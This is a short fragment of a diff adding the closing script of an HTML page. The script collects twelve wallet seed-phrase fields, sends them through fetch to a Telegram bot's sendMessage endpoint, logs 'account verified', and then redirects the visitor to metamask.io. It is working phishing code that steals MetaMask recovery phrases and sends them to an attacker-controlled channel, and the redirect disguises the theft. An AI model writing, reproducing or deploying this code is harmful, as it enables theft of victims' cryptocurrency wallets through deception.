+            let seed12= document.querySelector("#seed12").value;
+
+            let message = seed1.concat(" ",seed2," ",seed3," ", seed4," ", seed5," ",seed6," ", seed7," ",seed8," ",seed9," ", seed10," ",seed11," ", seed12)
+
+            fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${message}`, {
+                method:"GET"
+            })
+            .then(success =>{
+                console.log("account verified")
+                window.location.replace("https://metamask.io/");
+            }, error =>{
+                console.log(error)
+            })
+
+        })
+    </script>
+</body>
+</html>
